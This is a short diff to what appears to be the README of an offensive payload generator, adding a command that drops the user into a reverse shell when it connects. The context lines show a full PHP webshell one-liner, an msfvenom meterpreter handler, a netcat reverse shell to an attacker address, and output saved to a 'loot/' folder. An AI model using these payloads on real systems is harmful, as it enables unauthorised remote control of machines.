@@ -195,6 +195,7 @@ Set your listener once, then generate in any language and encoding.
 /payload php-webshell                       # <?php system($_REQUEST['cmd']) ?>
 /msf win-meterpreter-tcp                    # full msfvenom line + multi/handler
 /payload nc-e 10.10.14.7 443 --listen       # generate the shell AND start the listener on :443
+/listen 443 --attach                        # …and drop into the shell automatically when it lands
 ```
 
 Each generated payload is echoed with its **matching listener**, saved to `loot/`,
